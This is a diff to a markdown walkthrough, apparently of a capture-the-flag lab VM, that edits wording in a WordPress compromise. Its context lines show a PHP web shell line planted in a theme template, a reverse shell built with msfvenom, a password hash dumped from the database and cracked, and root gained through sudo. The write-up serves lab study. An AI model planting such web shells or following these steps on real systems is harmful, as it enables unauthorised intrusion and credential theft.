@@ -114,12 +114,12 @@ The `wordpress` installation uses weak credentials.
 > Trying to upload a standalone plugin to get a webshell fails, as the `wordpress` user does not seem to have permissions to write into the uploads folder.
 {: .prompt-danger }
 
-However, we can update the installed theme to get a webshell.  
+However, we can update the installed and activated theme to get a webshell.  
 
 > Therefore in the admin panel we navigate to `Appearance -> Editor -> Main Index Template (on the right)`
 {: .prompt-info }
 
-We add the following line and save.
+We add the following line and save the template.
 ```php
 system($_REQUEST['c']);
 ```
@@ -153,15 +153,17 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ...
 ```
 
-> We got a simple shell!
+> We got a web shell!
 {: .prompt-info }
 
 ---
 
 # post exploitation
 ## reverse shell
-The simple `bash` reverse shell oneliner does not seem to work.  
-Lets use `msfvenom` to generate a primitive reverse shell, upload it to the target and execute it.
+> The simple `bash` reverse shell oneliner does not seem to work.  
+{: .prompt-danger }
+
+Lets use `msfvenom` to generate a reverse shell binary, upload it to the target and execute it.
 
 Generate reverse shell binary
 ```bash
@@ -398,7 +400,7 @@ select * from wp_users;
 
 We got the password hash for the user `btrisk`:`a318e4507e5a74604aafb45e4741edd3`
 
-> Using the website `https://crackstation.net/` gives us the plaintext password for this hash `btrisk:roottoor`
+> Using the website `https://crackstation.net/` gives us the plaintext password for this hash `roottoor`
 {: .prompt-info }
 
 Now lets try this password for the system user `btrisk`.
@@ -412,10 +414,10 @@ id
 uid=1000(btrisk) gid=1000 groups=1000,4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
 ```
 
-> It worked! And we already see that this user is in the sudo group!
+> It worked! And we see that this user is in the sudo group!
 {: .prompt-info }
 
-Lets get `root`
+Lets get `root`!
 ```bash
 btrisk@ubuntu:/var/www/html/wordpress$ sudo su
 sudo su
